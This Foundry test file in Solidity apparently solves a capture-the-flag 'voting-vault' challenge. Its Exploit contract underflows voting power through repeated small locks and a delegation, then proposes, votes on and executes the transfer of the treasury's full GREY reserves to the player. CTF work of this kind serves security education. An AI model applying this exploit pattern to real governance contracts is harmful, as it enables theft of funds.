// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { Setup } from "../src/voting-vault/Setup.sol";
import { VotingVault } from "../src/voting-vault/VotingVault.sol";
import { Treasury } from "../src/voting-vault/Treasury.sol";
import { GREY } from "../src/voting-vault/lib/GREY.sol";

contract VotingVaultTest is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    Setup setup;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        assertTrue(setup.isSolved(), "not solved");
        vm.stopPrank();
    }

    function setUp() public {
        startHoax(deployer);
        setup = new Setup();
        vm.stopPrank();
    }

    function test_voting_vault() public checkSolvedByPlayer {
        Exploit exp = new Exploit(setup);
        exp.step1(); // voting power underflow
        exp.step2(); // propose
        vm.roll(block.number + 1); // next block
        exp.step3(); // vote and execute
    }
}

contract Exploit {
    GREY grey;
    VotingVault vault;
    Treasury treasury;
    uint256 proposeId;

    constructor (Setup setup) {
        grey = setup.grey();
        vault = setup.vault();
        treasury = setup.treasury();
        setup.claim();
    }

    function step1() external {
        grey.approve(address(vault), 4);
        for (uint256 i = 0; i < 4; ++i) {
            vault.lock(1);
            console.log(vault.votingPower(address(this), block.number));            
        }
        vault.delegate(address(0x1));
        console.log(vault.votingPower(address(this), block.number));
    }

    function step2() external {
        proposeId = treasury.propose(address(grey), treasury.reserves(address(grey)), msg.sender);
    }

    function step3() external {
        treasury.vote(proposeId);
        treasury.execute(proposeId);
    }
}